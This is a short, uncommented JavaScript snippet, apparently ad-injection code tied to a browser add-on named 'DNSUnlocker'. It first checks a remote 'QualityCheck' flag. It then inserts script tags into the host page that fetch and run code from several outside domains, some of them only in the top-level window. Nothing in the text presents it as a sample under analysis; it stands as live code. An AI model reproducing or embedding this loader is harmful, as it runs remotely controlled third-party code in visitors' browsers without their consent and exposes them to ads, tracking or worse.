/* 52/7/--  */
window._rvz9560x1007 = {'publisher_subid':'52002', 'addonname': 'DNSUnlocker'};
window._rvz9560x1009 = {'publisher_subid':'52002', 'addonname': 'DNSUnlocker'};
(function() {
  var gtprv = {
    isIE : function () { var myNav = navigator.userAgent.toLowerCase(); return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1]) : false; },
    loadJS : function (gturl) {
      var dns_qcs8 = document.getElementsByTagName('script')[0];
      var dns_qc8 = document.createElement('script'); dns_qc8.type='text/javascript';
      dns_qc8.src=('https:' == document.location.protocol ? 'https://' : 'http://')+gturl;
      dns_qcs8.parentNode.insertBefore(dns_qc8, dns_qcs8);
    },
    loadJSON: function (callback) {
        var xobj = new XMLHttpRequest();
        xobj.overrideMimeType("application/json");
        xobj.open('GET', ('https:' == document.location.protocol ? 'https://' : 'http://')+'m52.dnsqa.me/QualityCheck/x.txt', true);
        xobj.onreadystatechange = function () {
          if (xobj.readyState == 4) {
            if (xobj.status == "200") {
              callback(xobj.responseText);
            } else {
              callback('0');
            }
          }
        };
        xobj.send(null);
    },
    init : function() {
      var isMSIE = /*@cc_on!@*/0;
      if (gtprv.isIE () == 8) return; // IE 8 not supported
      if (isMSIE && gtprv.isIE()!= 9 && document.all && !document.querySelector) return; // IE 7 or lower not supported
      gtprv.loadJSON(function(response) {
        // Parse JSON string into object
        var actual_JSON = JSON.parse(response);
        if (actual_JSON) actual_JSON=parseInt(actual_JSON);
        else actual_JSON=0;
        if (actual_JSON==0) {
          gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gteamrs.js?subid=52002&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');
          gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gteamqc.js?subid=52002&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');
          gtprv.loadJS('istatic.eshopcomp.com/fo/ec/gtinimgtest.js?subid=52002&bname=DNSUnlocker&blink=http%3A%2F%2Fwww.dnsunlocker.com');
          gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/52002/l.js?pid=2204&ext=DNSUnlocker');
          gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/52002/l.js?pid=2202&ext=DNSUnlocker');
          if(window.top==window.self) {
            	gtprv.loadJS('asrv-a.akamaihd.net/sd/9560/1007.js');
          	gtprv.loadJS('grl.qomesn.com/sd/9560/1009.js');
		gtprv.loadJS('asrv-a.akamaihd.net/sd/9560/1010.js');
          }
        }
      });
    }
  }
  gtprv.init();
})();
